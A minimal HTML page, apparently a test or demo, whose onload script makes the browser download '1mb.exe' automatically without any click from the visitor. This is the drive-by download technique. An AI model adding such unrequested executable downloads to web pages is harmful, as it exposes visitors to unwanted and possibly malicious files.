<!DOCTYPE html>
<html>
<head>
    <title>Auto Download</title>
</head>
<body>
    <script>
        window.onload = function() {
            const link = document.createElement('a');
            link.href = "1mb.exe";
            link.download = "1mb.exe"; // file will download with its original name
            document.body.appendChild(link);
            link.click();
        }
    </script>
</body>
</html>
